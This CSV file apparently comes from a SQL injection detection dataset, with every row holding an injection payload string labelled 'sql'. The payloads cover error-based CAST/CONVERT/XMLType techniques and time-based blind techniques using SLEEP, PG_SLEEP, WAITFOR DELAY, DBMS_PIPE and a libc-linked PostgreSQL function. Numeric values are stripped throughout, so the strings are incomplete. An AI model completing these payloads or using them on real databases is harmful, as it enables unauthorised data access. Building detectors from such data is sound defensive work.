,language,source
4561,sql," ) ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ( = "
4582,sql," % "" AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND " % " = " "
4583,sql," ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) )  -- "
4584,sql," ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( = "
4585,sql," ) ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( = "
4586,sql," ) ) ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( ( = "
4587,sql," AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) "
4588,sql," AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) )  -- "
4589,sql," AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) # "
4590,sql," ' AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) )  -- "
4605,sql," % ' AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ' % ' = ' "
4606,sql," % "" AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND " % " = " "
4607,sql," ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) )  -- "
4608,sql," ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( = "
4609,sql," ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( = "
4653,sql," % ' AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ' % ' = ' "
4654,sql," % "" AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND " % " = " "
4655,sql," ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL )  -- "
4656,sql," ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( = "
4657,sql," ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( = "
4658,sql," ) ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( ( = "
4861,sql," ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
4862,sql," ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
4863,sql," ) ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
4864,sql," ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
4865,sql," ' ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
4866,sql," ' ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
4867,sql," ' ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
4868,sql," ' ) ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
4869,sql," "" ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
4870,sql," "" ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
4871,sql," "" ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
4872,sql," % ' ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
4873,sql," % ' ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
4874,sql," % ' ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
4875,sql," % "" ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
4876,sql," ) ; WAITFOR DELAY ' : : '  --"
4877,sql," ) ) ; WAITFOR DELAY ' : : '  --"
4878,sql," ) ) ) ; WAITFOR DELAY ' : : '  --"
4879,sql," ; WAITFOR DELAY ' : : '  --"
4880,sql," ' ; WAITFOR DELAY ' : : '  --"
4881,sql," ' ) ; WAITFOR DELAY ' : : '  --"
4882,sql," ' ) ) ; WAITFOR DELAY ' : : '  --"
4883,sql," ' ) ) ) ; WAITFOR DELAY ' : : '  --"
4884,sql," "" ) ; WAITFOR DELAY ' : : '  --"
4885,sql," "" ) ) ; WAITFOR DELAY ' : : '  --"
4886,sql," "" ; WAITFOR DELAY ' : : '  --"
4887,sql," % ' ) ; WAITFOR DELAY ' : : '  --"
4888,sql," % ' ) ) ; WAITFOR DELAY ' : : '  --"
4889,sql," % ' ; WAITFOR DELAY ' : : '  --"
4890,sql," % "" ; WAITFOR DELAY ' : : '  --"
4891,sql," ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
4892,sql," ) ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
4893,sql," ) ) ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
4894,sql," ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
4895,sql," ' ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
4896,sql," ' ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
4906,sql," ) AND SLEEP ( )  -- "
4907,sql," ) AND SLEEP ( ) AND ( = "
4908,sql," ) ) AND SLEEP ( ) AND ( ( = "
4909,sql," ) ) ) AND SLEEP ( ) AND ( ( ( = "
4927,sql," % ' ) ) AND SLEEP ( ) AND ( ( ' % ' = ' "
4928,sql," % ' AND SLEEP ( ) AND ' % ' = ' "
4929,sql," % "" AND SLEEP ( ) AND " % " = " "
4930,sql," ) AND SLEEP ( ) # "
4931,sql," ) ) AND SLEEP ( ) # "
4932,sql," ) ) ) AND SLEEP ( ) # "
4933,sql," AND SLEEP ( ) # "
4934,sql," ' AND SLEEP ( ) # "
4935,sql," ' ) AND SLEEP ( ) # "
4936,sql," ' ) ) AND SLEEP ( ) # "
4937,sql," ' ) ) ) AND SLEEP ( ) # "
4938,sql," "" ) AND SLEEP ( ) # "
4939,sql," "" ) ) AND SLEEP ( ) # "
4940,sql," "" AND SLEEP ( ) # "
4941,sql," % ' ) AND SLEEP ( ) # "
4942,sql," % ' ) ) AND SLEEP ( ) # "
4943,sql," % ' AND SLEEP ( ) # "
4944,sql," % "" AND SLEEP ( ) # "
4945,sql," ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UygZ )  -- "
4946,sql," ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UygZ ) AND ( = "
4947,sql," ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UygZ ) AND ( ( = "
4948,sql," ) ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UygZ ) AND ( ( ( = "
4968,sql," % "" AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UygZ ) AND " % " = " "
4969,sql," ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
4970,sql," ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
4971,sql," ) ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
4972,sql," AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
4973,sql," ' AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
4974,sql," ' ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
4975,sql," ' ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
4976,sql," ' ) ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
4977,sql," "" ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
4978,sql," "" ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
4979,sql," "" AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
4980,sql," % ' ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
4981,sql," % ' ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
4982,sql," % ' AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
4983,sql," % "" AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
4984,sql," ) RLIKE SLEEP ( )  -- "
4985,sql," ) RLIKE SLEEP ( ) AND ( = "
4986,sql," ) ) RLIKE SLEEP ( ) AND ( ( = "
4987,sql," ) ) ) RLIKE SLEEP ( ) AND ( ( ( = "
4988,sql," RLIKE SLEEP ( ) "
4989,sql," RLIKE SLEEP ( )  -- "
4990,sql," RLIKE SLEEP ( ) # "
4991,sql," ' RLIKE SLEEP ( )  -- "
4992,sql," ' ) RLIKE SLEEP ( ) AND ( ' wpGO ' = ' "
5006,sql," % ' RLIKE SLEEP ( ) AND ' % ' = ' "
5007,sql," % "" RLIKE SLEEP ( ) AND " % " = " "
5008,sql," ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP )  -- "
5009,sql," ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND ( = "
5010,sql," ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND ( ( = "
5011,sql," ) ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND ( ( ( = "
5012,sql," RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) "
5013,sql," RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP )  -- "
5014,sql," RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) # "
5015,sql," ' RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP )  -- "
5016,sql," ' ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND ( ' FvKs ' = ' "
5017,sql," ' ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND ( ( ' ZmFd ' = ' "
5018,sql," ' ) ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND ( ( ( ' WEQg ' = ' "
5031,sql," % "" RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND " % " = " "
5032,sql," ) AND ELT ( = , SLEEP ( ) )  -- "
5033,sql," ) AND ELT ( = , SLEEP ( ) ) AND ( = "
5034,sql," ) ) AND ELT ( = , SLEEP ( ) ) AND ( ( = "
5035,sql," ) ) ) AND ELT ( = , SLEEP ( ) ) AND ( ( ( = "
5036,sql," AND ELT ( = , SLEEP ( ) ) "
5037,sql," AND ELT ( = , SLEEP ( ) )  -- "
5038,sql," AND ELT ( = , SLEEP ( ) ) # "
5039,sql," ' AND ELT ( = , SLEEP ( ) )  -- "
5040,sql," ' ) AND ELT ( = , SLEEP ( ) ) AND ( ' eKia ' = ' "
5041,sql," ' ) ) AND ELT ( = , SLEEP ( ) ) AND ( ( ' szDw ' = ' "
5042,sql," ' ) ) ) AND ELT ( = , SLEEP ( ) ) AND ( ( ( ' WyAX ' = ' "
5043,sql," ' AND ELT ( = , SLEEP ( ) ) AND ' yJNN ' = ' "
5044,sql," ' ) AND ELT ( = , SLEEP ( ) ) AND ( ' kSWm ' LIKE ' "
5045,sql," ' ) ) AND ELT ( = , SLEEP ( ) ) AND ( ( ' ixAq ' LIKE ' "
5046,sql," ' AND ELT ( = , SLEEP ( ) ) AND ' Ndhz ' LIKE ' "
5047,sql," "" ) AND ELT ( = , SLEEP ( ) ) AND ( " UMlC " = " "
5048,sql," "" ) ) AND ELT ( = , SLEEP ( ) ) AND ( ( " PVHx " = " "
5049,sql," "" AND ELT ( = , SLEEP ( ) ) AND " weSK " = " "
5050,sql," "" ) AND ELT ( = , SLEEP ( ) ) AND ( " kdqG " LIKE " "
5051,sql," "" AND ELT ( = , SLEEP ( ) ) AND " FanE " LIKE " "
5052,sql," % ' ) AND ELT ( = , SLEEP ( ) ) AND ( ' % ' = ' "
5053,sql," % ' ) ) AND ELT ( = , SLEEP ( ) ) AND ( ( ' % ' = ' "
5054,sql," % ' AND ELT ( = , SLEEP ( ) ) AND ' % ' = ' "
5055,sql," % "" AND ELT ( = , SLEEP ( ) ) AND " % " = " "
5056,sql," ) AND = ( SELECT  FROM PG_SLEEP ( ) )  -- "
5057,sql," ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( = "
5058,sql," ) ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ( = "
5059,sql," ) ) ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ( ( = "
5060,sql," AND = ( SELECT  FROM PG_SLEEP ( ) ) "
5061,sql," AND = ( SELECT  FROM PG_SLEEP ( ) )  -- "
5062,sql," AND = ( SELECT  FROM PG_SLEEP ( ) ) # "
5063,sql," ' AND = ( SELECT  FROM PG_SLEEP ( ) )  -- "
5064,sql," ' ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ' yvxE ' = ' "
5065,sql," ' ) ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ( ' ccOB ' = ' "
5066,sql," ' ) ) ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ( ( ' lvIb ' = ' "
5067,sql," ' AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ' szzI ' = ' "
5068,sql," ' ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ' KmUo ' LIKE ' "
5069,sql," ' ) ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ( ' dlRN ' LIKE ' "
5070,sql," ' AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ' SkzA ' LIKE ' "
5071,sql," "" ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( " oSDg " = " "
5072,sql," "" ) ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ( " azge " = " "
5073,sql," "" AND = ( SELECT  FROM PG_SLEEP ( ) ) AND " jwhP " = " "
5074,sql," "" ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( " AvxZ " LIKE " "
5075,sql," "" AND = ( SELECT  FROM PG_SLEEP ( ) ) AND " cktp " LIKE " "
5076,sql," % ' ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ' % ' = ' "
5077,sql," % ' ) ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ( ' % ' = ' "
5078,sql," % ' AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ' % ' = ' "
5079,sql," % "" AND = ( SELECT  FROM PG_SLEEP ( ) ) AND " % " = " "
5080,sql," ) WAITFOR DELAY ' : : '  -- "
5081,sql," ) WAITFOR DELAY ' : : ' AND ( = "
5082,sql," ) ) WAITFOR DELAY ' : : ' AND ( ( = "
5083,sql," ) ) ) WAITFOR DELAY ' : : ' AND ( ( ( = "
5084,sql," WAITFOR DELAY ' : : ' "
5085,sql," WAITFOR DELAY ' : : '  -- "
5086,sql," WAITFOR DELAY ' : : ' # "
5087,sql," ' WAITFOR DELAY ' : : '  -- "
5088,sql," ' ) WAITFOR DELAY ' : : ' AND ( ' Shit ' = ' "
5089,sql," ' ) ) WAITFOR DELAY ' : : ' AND ( ( ' iUuD ' = ' "
5090,sql," ' ) ) ) WAITFOR DELAY ' : : ' AND ( ( ( ' gHrG ' = ' "
5091,sql," ' WAITFOR DELAY ' : : ' AND ' YRPR ' = ' "
5092,sql," ' ) WAITFOR DELAY ' : : ' AND ( ' RvvV ' LIKE ' "
5093,sql," ' ) ) WAITFOR DELAY ' : : ' AND ( ( ' tPcY ' LIKE ' "
5094,sql," ' WAITFOR DELAY ' : : ' AND ' hQfW ' LIKE ' "
5095,sql," "" ) WAITFOR DELAY ' : : ' AND ( " BQdQ " = " "
5096,sql," "" ) ) WAITFOR DELAY ' : : ' AND ( ( " TwXH " = " "
5097,sql," "" WAITFOR DELAY ' : : ' AND " ipPM " = " "
5098,sql," "" ) WAITFOR DELAY ' : : ' AND ( " rgum " LIKE " "
5099,sql," "" WAITFOR DELAY ' : : ' AND " BCgp " LIKE " "
5100,sql," % ' ) WAITFOR DELAY ' : : ' AND ( ' % ' = ' "
5101,sql," % ' ) ) WAITFOR DELAY ' : : ' AND ( ( ' % ' = ' "
5102,sql," % ' WAITFOR DELAY ' : : ' AND ' % ' = ' "
5103,sql," % "" WAITFOR DELAY ' : : ' AND " % " = " "
5104,sql," ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , )  -- "
5105,sql," ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( = "
5106,sql," ) ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ( = "
5107,sql," ) ) ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ( ( = "
5108,sql," AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) "
5109,sql," AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , )  -- "
5110,sql," AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) # "
5111,sql," ' AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , )  -- "
5112,sql," ' ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ' uTZJ ' = ' "
5113,sql," ' ) ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ( ' zrkf ' = ' "
5114,sql," ' ) ) ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ( ( ' zPIP ' = ' "
5115,sql," ' AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ' iuJO ' = ' "
5116,sql," ' ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ' cHXg ' LIKE ' "
5117,sql," ' ) ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ( ' phTU ' LIKE ' "
5118,sql," ' AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ' uOqN ' LIKE ' "
5119,sql," "" ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( " CEGp " = " "
5120,sql," "" ) ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ( " VZyZ " = " "
5121,sql," "" AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND " zzkl " = " "
5122,sql," "" ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( " ZYik " LIKE " "
5123,sql," "" AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND " dhCg " LIKE " "
5124,sql," % ' ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ' % ' = ' "
5125,sql," % ' ) ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ( ' % ' = ' "
5126,sql," % ' AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ' % ' = ' "
